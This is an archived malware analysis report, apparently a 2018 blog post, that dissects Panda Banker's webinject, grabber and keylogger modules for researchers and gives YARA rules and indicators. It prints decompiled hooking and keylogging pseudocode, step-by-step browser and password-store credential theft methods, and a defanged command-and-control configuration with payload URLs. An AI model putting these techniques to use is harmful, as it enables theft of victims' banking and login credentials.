{
    "id": "95922ccd-5392-45a4-8044-27054647798c",
    "created_at": "2023-01-12T15:09:20.656839Z",
    "updated_at": "2025-03-27T02:06:14.261902Z",
    "deleted_at": null,
    "sha1_hash": "23ad106d37c7d40003a0506157c3de3b4fa50114",
    "title": "2018-08-20 - Let's Learn- Dissecting Panda Banker & Modules- Webinject, Grabber & Keylogger DLL Modules",
    "authors": "",
    "file_creation_date": "2022-05-28T04:39:59Z",
    "file_modification_date": "2022-05-28T04:39:59Z",
    "file_size": 456293,
    "plain_text": "# Let's Learn: Dissecting Panda Banker & Modules: Webinject, Grabber & Keylogger DLL Modules\n\n**[vkremez.com/2018/08/lets-learn-dissecting-panda-banker.html](https://www.vkremez.com/2018/08/lets-learn-dissecting-panda-banker.html)**\n\n## Goal: Reverse engineer the latest Panda Banker malware and detail the modules associated with the popular malware. The research aims to fill researcher gaps with the detailed information related to Panda modules and their detection.\n\n Unknown Campaign -> #GrandSoft Exploit Kit -> #SmokeLoader -> #ZeusPandahttps://t.co/YfAR2MmVfe pic.twitter.com/7yxtIGhBPg — nao_sec (@nao_sec) August 16, 2018\n\n Source:\n Panda Loader packed (MD5: 97820f5167ede76dc466efdd239a5ba4)\n Panda Core unpacked(MD5: 08124df7f51280af3c99360e0a80e9c8)\n Panda LibInject x86 (32-bit) DLL Module \"libinject.dll\" (MD5: eb92c528455f5b14dd971e7126f6271f)\n Panda Grabber x86 (32-bit) DLL Module \"grabber.dll\" (MD5: b830680a74a9fb0e71a59df57ab36f3d)\n Panda Keylogger x86 (32-bit) Module \"keylogger32.dll\" (MD5: 487e09c2da9e59fbc7f0690bf08a7a7e)\n Panda Webinject x86 (32-bit) DLL Client (MD5: c310165d1a438031d7781eb623f64872)\n Outline:\n```\nI. Background\nII. Panda Webinject x86 (32-bit) DLL Client\nIII. Hooking Engine: \"MinHook\"-like Library\nIV. Panda x86 (32-bit) \"grabber.dll\" Module\nV. Panda x86 (32-bit) \"keylogger32.dll\" Module: RAWINPUT\nVI. Yara Signature\nA. Panda Grabber Module\nB. Panda Keylogger Module\nC. Panda Webinject Client\nVII. Appendix\nA. Dynamic Configuration\nB. Panda Command-and-Control Server\nC. Hooked APIs\n\n Analysis:\n I. Background\n Panda Banker is an information-stealing malware that leverages various methods to steal data from compromised machines including webinjects to steal financial credentials and keylogger module for intecepting keys.\n GDATA previously extensively covered the Panda Banker main functionality, including but\n\n```\n\n-----\n\n## not not limited to its extensive anti-analysis techniques. I highly recommend reading this paper before learning more about Panda. Panda is a known Zeus banker derivative and shares significant code overlap with the original leaked Zeus 2.0.8.9. By and large, Panda banker remains to be one of the most popular banking malware available on the crimeware scene that is available for sale for $7,500 USD in its basic functionality. Some of the advertised capabilities are as follows:\n```\nFormgrabber for Internet Explorer (IE), Chrome, and Firefox\nGrabber for screenshots, passwords, cookies, certifications,\ncredit cards\nPOP3/FTP\nFile Search\nSOCKS support\nVirtual Network Computing (VNC)\nInjects\n\n Previously, I extensively covered its injection technique as part of the Panda banker libinject.dll leveraging \"AcInitialize\" and \"AdInjectDll\" export functions. ZwWow64QueryInformationProcess64-ZwWow64ReadVirtualMemory64 are used for searching NTDLL in PEB, then for searching API addresses required for work of injecting DLL module (x32/x64) which is being located in AP \"svchost\" by using NtCreateSection- NtMapViewOfSection-NtUnmapViewOfSection ResumeThread-Sleep-SuspendThread are used for unmapping and injecting the payload into the main thread.\n AcInitialize: size_t function type that initializes the structures necessary for the injection export function. AdInjectDll: DWORD function type that performs the process injection with the argument with the desired process ID (PID) as an argument of the DWRD type.\n\n II. Panda Webinject x86 (32-bit) Client Panda banker stores both local and dynamic configuration in JavaScript format that used for command-and-control and subsequent communications. The local configuration is as follows of the exe type that is used in conjunction with the stored public key:\n///////////////////////////////////////////////////\n///////////// Basic Panda URL config //////////////\n///////////////////////////////////////////////////\n\"generated_url\":[\"47[.]com/rcfig.dat\", \"98[.]net/rcfig.dat\",\"10[.]net/rcong.dat\", \n\"98[.]net/vgt.dat\"]\n\n The dynamic configuration is parsed for the following values:\n\n```\n\n-----\n\n```\n//////////////////////////////////////////////////////////////////////////\n/////////////////////// Panda ParseDynamicConfig *shortened //////////////\n//////////////////////////////////////////////////////////////////////////\nvoid *__cdecl parse_dynamic_config(int a1)\n{\n const char *grab_value;\n grab_value = 0;\n switch ( a1 )\n {\n  case 0:\n   grab_value = \"created\";\n   break;\n  case 1:\n   grab_value = \"botnet\";\n   break;\n  case 2:\n   grab_value = \"check_config\";\n   break;\n  case 3:\n   grab_value = \"send_report\";\n   break;\n  case 4:\n   grab_value = \"check_update\";\n   break;\n  case 5:\n   grab_value = \"url_config\";\n   break;\n  case 6:\n   grab_value = \"url_webinjects\";\n   break;\n  case 7:\n   grab_value = \"url_update\";\n   break;\n  case 8:\n   grab_value = \"url_plugin_vnc32\";\n   break;\n  case 9:\n   grab_value = \"url_plugin_vnc64\";\n   break;\n  case 10:\n   grab_value = \"url_plugin_vnc_backserver\";\n   break;\n  case 11:\n   grab_value = \"url_plugin_grabber\";\n   break;\n  case 12:\n   grab_value = \"url_plugin_backsocks\";\n   break;\n  case 13:\n   grab_value = \"url_plugin_backsocks_backserver\";\n   break;\n  case 14:\n\n```\n\n-----\n\n## Additionally, the bot checks machine software and runs various WMI queries to populate the data about the infected machine such as:\n```\nSelect * from AntiVirusProduct\nSelect * from AntiSpywareProduct\nSelect * from FirewallProduct\n\n The bot also generates information object about the infected machine. The elongated version is as follows:\n//////////////////////////////////////////////////\n///////////// Elongated Panda BotInfo ////////////\n//////////////////////////////////////////////////\n\"BotInfo\": {\n\"systime\": UNIX,\n\"process\": \"svchost.exe\",\n\"user\": \"MACHINE\",\n\"id\":  \"BOT\",\n\"botnet\":  \"2.6.9\",\n\"version\": \"2.6.10\",\n\"os\":  {\n\"version\": INT,\n\"sp\":  INT,\n\"build\":  INT,\n\"bit\": INT,\n\"server\":  INT,\n\"lang\": INT,\n\"explorer\": INT\n\"File\":\n\"name\": \"webinjects.dat\",\n\"antivirus\": DWORD,\n\"antispyware\": DWORD.\n\"firewall\": DWORD,\n}\n\n Panda injects its main bot after the successful infection to hook various browser API, TranslateMessage, and GetClipboardData. The main injected contains 354 functions. The main injected bot INT-type function is as follows:\n\n```\n\n-----\n\n```\n//////////////////////////////////////////////////////////////////////////\n///////////////////////// Panda MainInject Function //////////////////////\n//////////////////////////////////////////////////////////////////////////\nint Panda_main_inject()\n{\n int result;\n HMODULE user32_1; \n HMODULE user32; \n result = Hook_Initialize();\n if ( !result )\n {\n  Addend = 0;\n  dword_1001047C = (int)sub_10006122;\n  user32_1 = GetModuleHandleW(L\"user32.dll\");\n  *(_DWORD *)TranslateMessage_0 = GetProcAddress(user32_1, \"TranslateMessage\");\n  dword_10010488 = (int)sub_10006077;\n  user32 = GetModuleHandleW(L\"user32.dll\");\n  *(_DWORD *)GetClipboardData = GetProcAddress(user32, \"GetClipboardData\");\n  hook_main_entrance((int)TranslateMessage_0, 2u);\n  hook_ie();\n  hook_firefox();\n  hook_wsa_chrome_check_opera();\n  result = EnableHook(0);\n }\n return result;\n}\n\n## III. Hooking Engine: \"MinHook\"-like Library Panda Banker utilizes a \"MinHook\"-like hooking engine to hook various API of interest. MinHook is a known minimalistic x86/x64 API hooking library for Windows that is leveraged by various banking malware (most notoriously, TinyNuke banker) to hook various browser API for information-stealing purposes. For example, Panda uses this routine to enable hooks for Mozilla Firefox browser API calls PR_Close, PR_Read, PR_Write, and PR_Poll from nss3.dll.\n\n```\n\n-----\n\n## The CreateHook function sequence is as follows:\n\n The CreateHook function sequence -> \"EnterSpinLock\" (via InterlockedCompareExchange API call) -> checks if \"IsExecutableAddress\" (via VirtualQuery API call with Buffer.State and Buffer.Protect check for executable) -> \"FindHookEntry\" (DWORD entry) -> \"AllocateBuffer\" (via VirtualAlloc API call) -> \"CreateTrampolineFunction\" -> if not entry \"AddHookEntry\" -> \"FreeBuffer\" -> \"LeaveSpinLock\". By and large, the Panda hooking engine works by replacing the prologue of the targeted API call with the unconditional JMP to the detour function. Panda enables its hooks as as follows leveraging VirtualProtect with the usual pJmp- >opcode = 0xE9 (32-bit relative JMP). The pseudo-coded C++ EnableHook function is as follows:\n\n\n-----\n\n```\n//////////////////////////////////////////////////////////////////////////\n///////////////////////// Panda EnableHook Function //////////////////////\n//////////////////////////////////////////////////////////////////////////\nsigned int __fastcall Panda_EnableHook(int a1, int patch_above)\n{\n hook_entry = patch_above;\n v3 = lpMem + 44 * a1;\n patchSize = 5;\n v10 = patch_above;              \n dwSize = 5;\n v5 = (*(_BYTE *)(v3 + 20) & 1) == 0;\n pPatchTarget = *(_WORD **)v3;\n v13 = *(_WORD **)v3;\n if ( !v5 )\n {\n  pPatchTarget = (_WORD *)((char *)pPatchTarget - 5);\n  patchSize = 7;\n  v13 = pPatchTarget;\n  dwSize = 7;\n }\n if ( VirtualProtect(pPatchTarget, patchSize, 0x40u, &flOldProtect) )\n {\n  if ( hook_entry )\n  {                      // enable hook\n   *(_BYTE *)pPatchTarget = 0xE9u;      // jump relative opcode 0xe9\n   *(_DWORD *)((char *)pPatchTarget + 1) = *(_DWORD *)(v3 + 4) (_DWORD)pPatchTarget - 5;\n   if ( *(_BYTE *)(v3 + 0x14) & 1 )\n    **(_WORD **)v3 = 0xF9EBu;\n  }\n  else if ( *(_BYTE *)(v3 + 0x14) & 1 )\n  {\n   *(_DWORD *)pPatchTarget = *(_DWORD *)(v3 + 0xC);\n   v8 = (int)(pPatchTarget + 2);\n   *(_WORD *)v8 = *(_WORD *)(v3 + 0x10);\n   *(_BYTE *)(v8 + 2) = *(_BYTE *)(v3 + 0x12);\n   pPatchTarget = v13;\n  }\n  else\n  {\n   *(_DWORD *)pPatchTarget = *(_DWORD *)(v3 + 12);\n   *((_BYTE *)pPatchTarget + 4) = *(_BYTE *)(v3 + 16);\n  }\n  VirtualProtect(pPatchTarget, dwSize, flOldProtect, &flOldProtect);\n  v9 = GetCurrentProcess();\n  FlushInstructionCache(v9, pPatchTarget, dwSize);\n  result = 0;\n  *(_BYTE *)(v3 + 20) = 4 * (v10 & 1) | (*(_BYTE *)(v3 + 20) & 0xFD | 2 * (v10 &\n1)) & 0xFB;\n }\n else\n {\n  result = 10;\n }\n\n```\n\n-----\n\n```\n return result;\n}\n\n## IV. Panda x86 (32-bit) \"grabber.dll\" Module Panda leverages and injects into svchost.exe the module called internally \"grabber.dll.\" This module contains 336 functions.\n\n The module designed to steal stored information from various software applications as as well as delete it as necessary in order to force the victim to enter it again to be stolen by the malware.\n\n Name Address Ordinal\n\n DeleteCache 10003E10 1\n\n DeleteCookies 10003E4A 2\n\n DeleteFlash 10003E89 3\n\n GrabCertificates 10004D7B 4\n\n GrabCookies 10004DDB 5\n\n GrabFlash 10005106 6\n\n GrabForms 10005139 7\n\n GrabPasswords 100053C9 8\n\n GrabSoftList 100054CD 9\n\n DllEntryPoint 1000118A [main entry]\n\n The brief outline of all the functions is as follows: A. \"GrabSoftList\" function (ordinal 9) as temporarily stored \"softlist.txt\" The malware opens a registry key\n\n```\n\n-----\n\n## HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall and enumerates keys \"UninstallString\" and \"DisplayName\" via RegEnumKeyExW API to obtain a list of installed software B. \"GrabCertificates\" function (ordinal 4) Panda opens the so-called \"certificate store\" to query for certificates via the following API calls:\n CertOpenSystemStoreW CertEnumCertificatesInStore PFXExportCertStoreEx(..., &pPFX, L\"password\", 0, 4) GetSystemTime CertCloseStore\n\n The malware stores the cerificafres in the following format: certs\\\\%s\\\\%s_%02u_%02u_%04u.pfx (pPFX.pbData, pPFX.cbData) C. \"GrabCookies\" function (ordinal 5) as temporarily stored cookies.txt Panda grabs cookies from the following browser grab calls:\n InternetExplorerGetCookies (local search as \"*.txt\" in APPDATA\\Low) MicrosoftEdgeGetCookies (local search as Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe) FirefoxGetCookies (local search as Mozilla\\Firefox for \"cookies.sqlite\") ChromeGetCookies (local search as Google\\Chrome for \"cookies\") OperaGetCookies (local search as Opera Software for \"cookies\")\n\n D. \"GrabForms\" function (ordinal 7) as temporarily \"autoforms.txt\" The malware steals stored form data from browser application as follows:\n Internet_Explorer -> registry \"HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\IntelliForms\\FormData\" Google Chrome -> \"Google\\Chrome\" for \"web data\" Mozilla Firefox -> \"Mozilla\\Firefox\" for \"formhistory.sqlite\" Opera -> \"Opera Software\" for \"web data\"\n\n E. \"GrabFlash\" function (ordinal 6) Panda grabs Flashplayer persistent cookie information in \"APPDATA Macromedia\\Flash Player\" for \"*.sol\" and \"flashplayer.cab.\" F. \"GrabPasswords\" function (ordinal 8) as temporarily \"passwords.txt\" The malware steals passwords from the following software:\n\n\n-----\n\n```\nInternetExplorer \nMozilla Firefox (registry parser method)\nGoogle Chrome (local file searcher)\nOpera (local file searcher)\nMicrosoft Outlook (registry parser method)\nWindows LiveMail(registry parser method)\nThunderbird (registry parser method)\nFireFTP (registry parser method)\nWinSCP (registry parser method)\nTotalCommander (registry and local parser method)\nFileZilla (registry parser method)\nCuteFTP (registry and local parser method)\n\n## For example, the malware steals Internet Explorer passwords via multiple methods:\n Grabs passwords via \"HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2” for stored autocomplete Internet Explorer credentials. Enumerates the credentials using the CredEnumerateW API while filtering with “Microsoft_WinInet_.” The credentials are then decrypted using CryptUnprotectData in conjunction with the GUID “abe2869f-9b47-4cd9-a358-c22904dba7f7” as the decryption salt. Leverages Windows Vault API to enumerate and extract credentials stored by Microsoft Windows Vault.\n\n The stolen information is stored as follows: \"Soft: %s\\tType: %s\\tHost : %S\\tUser : %S\\tPass : %S\\r\\n\" G. \"DeleteFlash,\" \"DeleteCookies,\" and \"DeleteCache\" functions (ordinal 3, 2, 1 respectively) Panda leverages these functions to remove and reset various cached and stored credentials and force the victim to enter them again with the goal to intercept them at the point of victim reentry of them. V. Panda x86 (32-bit) \"keylogger32.dll\" Module: RAWINPUT Method The malware also deploys a custom keylogger32.dll module to steal keyed data as well as to grab screenshots and intercept copied clipboard data leveraging \"RAWINPUT\" method.\n\n```\n\n-----\n\n## The following exports as used as part of the module:\n\n Name Address Ordinal\n\n LoggerStart 1000209B 1\n\n LoggerStop 1000216B 2\n\n DllEntryPoint 10001105 [main entry]\n\n The main function \"LoggerStart\" launched keylogger process via a separate thread. The thread sets up execution via CreateWindowExW with lpfnWndProc as a pointer to its function that processes window messages. The very similar keylogger method is described here. By and large, the keylogger creates the the invisible message only window with the pseudorandom lpszClassName value generated as follows leveraging __rdtsc call (the processor time stamp, which represents the number of clock cycles since the last reset):\n```\n/////////////////////////////////////////\n// Panda Keylogger Generate ClassName //\n///////////////////////////////////////// \n v1 = dword_1000522C;\n v2 = 0;\n do\n {\n  if ( !v1 )\n  {\n   v3 = __rdtsc();\n   v1 = v3;\n  }\n  v1 = 214013 * v1 + 2531011;\n  lpcClassName[v2++] = ((v1 >> 16) & 32767ui64) % 25 + 97;\n }\n\n Ultimately, the keylogger passes only the bear minimum values to create an invisible \"Message Only Window\" as follows:\n\n```\n\n-----\n\n## CreateWindowExW(0, v7.lpszClassName, 0, 0, 0, 0, 0, 0, HWND_MESSAGE, 0, v7.hInstance, 0)\n\n Panda uses RegisterRawInputDevices function to register and record calls. The first parameter points to the array of RAWINPUTDEVICE structs. the GetRawInputData first parameter is a handle to the RAWINPUT structure from the device, whose members are, due to usUsagePage=1 (generic desktop controls)and usUsage=6 (keyboard). The pressed keys of intereest are processed with MapVirtualKey and translated to characters and saved to a file later.\n\n\n-----\n\n```\n//////////////////////////////////////// \n//////// Panda Keylogger KeyProcessor //\n//////////////////////////////////////// \n GetWindowTextW_0((int)&v13, v2);\n  v13 = 0;\n  v4 = GetWindowThreadProcessId(v2, 0);\n  dwhkl = GetKeyboardLayout(v4);\n  v5 = GetCurrentThreadId();\n  AttachThreadInput(v4, v5, 1);\n  GetKeyboardState(&KeyState);\n  v6 = GetCurrentThreadId();\n  AttachThreadInput(v4, v6, 0);\n  switch ( uCode )\n  {\n   case 8u:\n    v10 = wsprintfW(&v14, L\"[BACKSPACE]\");\n    break;\n   case 9u:\n    v10 = wsprintfW(&v14, L\"[TAB]\");\n    break;\n   case 0xDu:\n    v10 = wsprintfW(&v14, L\"[ENTER]\");\n    break;\n   case 0x1Bu:\n    v10 = wsprintfW(&v14, L\"[ESC]\");\n    break;\n   case 0x20u:\n    v10 = wsprintfW(&v14, (LPCWSTR)\" \");\n    break;\n   default:\n    v7 = dwhkl;\n    v8 = MapVirtualKeyExW(uCode, 0, dwhkl);\n    v9 = v8;\n    if ( uCode >= 33 && (uCode <= 40 || uCode > 44 && (uCode <= 46 || uCode ==\n111 || uCode == 144)) )\n     v9 = v8 | 0x100;\n    memset(&Dst, 0, 64u);\n    if ( ToUnicodeEx(uCode, v9, &KeyState, (LPWSTR)&Dst, 32, 0, v7) <= 0 )\n    {\n     if ( GetKeyNameTextW((unsigned __int16)v9 << 16, (LPWSTR)&Dst, 32) <= 0 )\n      return;\n     v10 = wsprintfW(&v14, L\"[%s]\", &Dst);\n    }\n    else\n    {\n     v10 = wsprintfW(&v14, L\"%s\", &Dst);\n     byte_10005198 = 0;\n    }\n    break;\n  }\n  if ( v10 )\n   Clipboard_wsprintf((int)&v13);\n }\n}\n\n```\n\n-----\n\n## Additionally, the malware steals copied clipboard data via sequence of OpenClipboard, GetClipboardData, and SetClipboardViewer API calls receiving a WM_DRAWCLIPBOARD. The stolen data is stored in the following format with the timestamp:\n L\"\\r\\n[Clipboard || %s]\\r\\n\"\n\n It is also notable the keylogger malware also has capabilities to JPEG screenshots via the usual GDI library DLL. VI. Yara Signature A. Panda Grabber Module\n```\nimport \"pe\"\nrule crime_win32_panda_banker_grabber_dll {\n  meta:\n   description = \"Detects Panda Banker grabber.dll module\"\n   author = \"@VK_Intel\"\n   date = \"2018-08-18\"\n   hash1 = \"7f85d26b4eb5f704544e2d1af97100f6e3a71b866d4ae2375cc3bbbac2a3f9c9\"\n  strings:\n   $s1 = \"Grabber: OutlookReadPassword - unsupported password type\" fullword wide\n   $s2 = \"Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows Messaging\nSubsystem\\\\Profiles\\\\Outlook\" fullword wide\n   $s3 = \"Grabber: OperaGetCookies - ok\" fullword wide\n   $s4 = \"Grabber: GrabTotalCommander - ok\" fullword wide\n   $s5 = \"grabber.dll\" fullword ascii\n   $s6 = \"Pstorec.dll\" fullword wide\n   $s7 = \"SMTP Password\" fullword wide\n   $s8 = \"Grabber: GrabPasswords - ok\" fullword wide\n   $s9 = \"Grabber: FirefoxGetCookies - ok\" fullword wide\n   $s10 = \"Grabber: IEGetCookies - ok\" fullword wide\n   $s11 = \"Grabber: ChromeGetCookies - ok\" fullword wide\n   $s12 = \"Grabber: EdgeGetCookies - ok\" fullword wide\n   $s13 = \"webdav.tappin.com\" fullword ascii\n   $s14 = \"passwords.txt\" fullword wide\n   $s15 = \"fireFTPsites.dat\" fullword wide\n   $s16 = \"certs\\\\%s\\\\%s_%02u_%02u_%04u.pfx\" fullword wide\n   $s17 = \"Grabber: FirefoxGetCookies - called\" fullword wide\n   $s18 = \"Grabber: GrabCuteFTP - ok\" fullword wide\n  condition:\n   ( uint16(0) == 0x5a4d and\n     filesize < 200KB and\n     pe.imphash() == \"8031528b770e1d9f25f2e64511835e27\" and\npe.exports(\"DeleteCache\") and pe.exports(\"DeleteCookies\") and\npe.exports(\"DeleteFlash\") and pe.exports(\"GrabCertificates\") and\npe.exports(\"GrabCookies\") and pe.exports(\"GrabFlash\") and\n     ( 8 of them )\n   ) or ( all of them )\n}\n\n B. Panda Keylogger Module\n\n```\n\n-----\n\n```\nimport pe \nrule crime_win32_panda_banker_keylogger_dll {\n  meta:\n   description = \"Detects Panda Banker keylogger.dll module\"\n   author = \"@VK_Intel\"\n   date = \"2018-08-18\"\n   hash1 = \"99d116c1e3defb75ebde30e5fcca9a78e16889cde3025823a106ed741fad711c\"\n  strings:\n   $x1 = \"keylogger32.dll\" fullword ascii\n   $s2 = \"%s%4d-%02d-%02d_%02d-%02d-%02d-%04d.jpg\" fullword ascii\n   $s3 = \"LoggerStart\" fullword ascii\n   $s4 = \"LoggerStop\" fullword ascii\n   $s5 = \":,:6:R:\\\\:\" fullword ascii\n  condition:\n   ( uint16(0) == 0x5a4d and\n     filesize < 40KB and\n     pe.imphash() == \"8c964d45bdb5d28ad0f6d7e92b0efea0\" and\npe.exports(\"LoggerStart\") and pe.exports(\"LoggerStop\") and\n     ( 1 of ($x*) or all of them )\n   ) or ( all of them )\n}\n\n## C. Panda Webinject Client\n\n```\n\n-----\n\n```\nimport pe \nrule crime_win32_panda_banker_webinject_dll_client {\n  meta:\n   description = \"Detects webinject Panda DLL client\"\n   author = \"@VK_Intel\"\n   date = \"2018-08-18\"\n   hash1 = \"6a7ec42e06446d8133e4e6838042a38f6198b54b3664fe6bb4df25537493c2f8\"\n  strings:\n   $s1 = \"opera_browser.dll\" fullword wide\n   $s2 = \"microsoftedgecp.exe\" fullword wide\n   $s3 = \"microsoftedge.exe\" fullword wide\n   $s4 = \"webinjects\" fullword ascii\n   $s5 = \"grabbed\\\\%S_%02u_%02u_%02u.txt\" fullword wide\n   $s6 = \"HTTP authentication: username=\\\"%s\\\", password=\\\"%s\\\"\" fullword wide\n   $s7 = \"url_plugin_keylogger\" fullword ascii\n   $s8 = \"url_plugin_webinject64\" fullword ascii\n   $s9 = \"url_plugin_webinject32\" fullword ascii\n   $s10 = \"testinject\" fullword ascii\n   $s11 = \"url_webinjects\" fullword ascii\n   $s12 = \"webinject%ddata\" fullword ascii\n   $s13 = \"screen_process\" fullword ascii\n   $s14 = \"notify_process\" fullword ascii\n   $s15 = \"keylog_process\" fullword ascii\n   $s16 = \"list_blockedinjects\" fullword ascii\n   $s17 = \"screenshots\\\\%s\\\\%04x_%08x.jpg\" fullword wide\n   $s18 = \"HTTP authentication (encoded): %S\" fullword wide\n   $s19 = \"inject_vnc\" fullword ascii\n   $s20 = \"X-Content-Security-Policy\" fullword ascii\n  condition:\n   ( uint16(0) == 0x5a4d and\n     filesize < 200KB and\n     pe.imphash() == \"c06f3ba3522256a0075a0d89fb44cd42\" and\n     ( 8 of them )\n   ) or ( all of them )\n}\n\n## VII. Appendix A. Dynamic Configuration\n\n```\n\n-----\n\n```\n{\n\"botnet\":  \"2.6.9\",\n\"check_config\": 327685,\n\"send_report\": 327685,\n\"check_update\": 327685,\n\"url_config\":  \"hXXps://uiaoduiiej.chimkent[.]su/5fewucaopezanxenuzebu.dat\",\n\"url_webinjects\":  \"hXXps://uiaoduiiej.chimkent[.]su/webinjects.dat\",\n\"url_update\":  \"hXXps://uiaoduiiej.chimkent[.]su/5fewucaopezanxenuzebu.exe\",\n\"url_plugin_webinject32\":  \"hXXps://uiaoduiiej.chimkent[.]su/webinject32.bin\",\n\"url_plugin_webinject64\":  \"hXXps://uiaoduiiej.chimkent[.]su/webinject64.bin\",\n\"remove_csp\":  1,\n\"inject_vnc\":  1,\n\"url_plugin_vnc32\": \"hXXps://uiaoduiiej.chimkent[.]su/vnc32.bin\",\n\"url_plugin_vnc64\": \"hXXps://uiaoduiiej.chimkent[.]su/vnc64.bin\",\n\"url_plugin_vnc_backserver\":  \"nityYUQPeUwsKYfNAKh7c9O8lCQ=\",\n\"url_plugin_backsocks\": \"hXXps://uiaoduiiej.chimkent[.]su/backsocks.bin\",\n\"url_plugin_backsocks_backserver\": \"nityYUQPeUwsKYfNAKh7c9O8lCQ=\",\n\"url_plugin_grabber\":  \"hXXps://uiaoduiiej.chimkent[.]su/grabber.bin\",\n\"grabber_pause\":  1,\n\"grab_softlist\":  1,\n\"grab_pass\":  1,\n\"grab_form\":  1,\n\"grab_cert\":  1,\n\"grab_cookie\": 1,\n\"grab_del_cookie\": 0,\n\"grab_del_cache\":  0,\n\"url_plugin_keylogger\": \"hXXps://uiaoduiiej.chimkent[.]su/keylogger.bin\",\n\"keylog_process\": \n\"ZmlyZWZveC5leGUAY2hyb21lLmV4ZQBpZXhwbG9yZS5leGUAb3BlcmEuZXhlAAA=\",\n\"screen_process\":  \"cHV0dHkuZXhlAAA=\",\n\"reserved\":\n\"JxZpa8bZHbYkIIvhyEd1cVZ/nS6URxD5wnvrDNiAjyi3xnWW8S8q9f/0ap+7kLHnW4XhNudnwRRizwE=\"\n}\n\n## B. Panda Command-and-Control:\nurimchi3dt4[.]website\n\n C. Hooked APIs\n\n```\n\n-----\n\n```\nHooked API:\nInternet Explorer (wininet.dll):\nHttpSendRequestW       \nHttpSendRequestA       \nHttpSendRequestExW      \nHttpSendRequestExA      \nInternetReadFile       \nInternetReadFileExA     \nInternetReadFileExW     \nInternetQueryDataAvailable  \nInternetCloseHandle     \nHttpOpenRequestA       \nHttpOpenRequestW       \nHttpQueryInfoA        \nInternetConnectA       \nInternetConnectW       \nInternetWriteFile\nMozilla Firefox (nss3.dll):     \nPR_Close           \nPR_Read           \nPR_Write           \nPR_Poll\nGoogle Chrome (chrome.dll):                     \nSSL_read\nSSL_write\nWinsock 2 (ws2_32.dll):\nclosesocket         \nWSASend           \nWSARecv           \nrecv \nuser32.dll:            \nTranslateMessage\nGetClipboardData\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-08-20 - Let's Learn- Dissecting Panda Banker & Modules- Webinject, Grabber & Keylogger DLL Modules.pdf"
    ],
    "report_names": [
        "2018-08-20 - Let's Learn- Dissecting Panda Banker & Modules- Webinject, Grabber & Keylogger DLL Modules.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536160,
    "ts_updated_at": 1743041174,
    "ts_creation_date": 1653712799,
    "ts_modification_date": 1653712799,
    "files": {
        "pdf": "https://archive.orkl.eu/23ad106d37c7d40003a0506157c3de3b4fa50114.pdf",
        "text": "https://archive.orkl.eu/23ad106d37c7d40003a0506157c3de3b4fa50114.txt",
        "img": "https://archive.orkl.eu/23ad106d37c7d40003a0506157c3de3b4fa50114.jpg"
    }
}